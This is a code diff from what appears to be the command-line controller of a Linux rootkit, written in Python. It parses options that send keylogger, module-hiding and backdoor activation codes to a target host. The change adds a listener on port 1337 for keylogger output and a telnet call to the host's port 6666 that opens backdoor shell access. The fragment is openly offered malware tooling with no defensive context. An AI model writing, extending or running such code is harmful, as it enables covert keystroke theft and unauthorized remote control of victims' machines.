@@ -106,21 +106,29 @@ code = 0
 host = ""
 options, remainder =  getopt.getopt(sys.argv[1:], 'a:d:h:u',[])
 if len(sys.argv) != 1:
-    start_socket(1337)
-    for opt, arg in options:
-        if opt == "-a" and arg == "key":
-            code = ROOTKIT_KEYLOGGER_ACTIVATE
-	elif opt == "-d" and arg == "hide":
-            code = HIDEMODULE_DEACTIVATION_CODE
-	elif opt == "-a" and arg == "hide":
-            code = HIDEMODULE_ACTIVATION_CODE
-        elif opt == "-h":
-            host = arg
-	elif opt == "-a" and arg == "root":
-	    code = BACKDOOR_ACTIVATION_CODE
-            
-   is_admin()
-   send_message(host, code)
+	listen=False
+	start_root=False
+	for opt, arg in options:
+		if opt == "-a" and arg == "key":
+			code = ROOTKIT_KEYLOGGER_ACTIVATE
+			listen=True
+		elif opt == "-d" and arg == "hide":
+			code = HIDEMODULE_DEACTIVATION_CODE
+		elif opt == "-a" and arg == "hide":
+			code = HIDEMODULE_ACTIVATION_CODE
+		elif opt == "-h":
+			host = arg
+		elif opt == "-a" and arg == "root":
+			code = BACKDOOR_ACTIVATION_CODE
+			start_root=True
+		    
+	is_admin()
+	send_message(host, code)
+	if listen:
+		start_socket(1337)
+	if start_root:
+		from subprocess import call
+		call(["telnet", host, "6666"])
 else:
     print_usage()
 
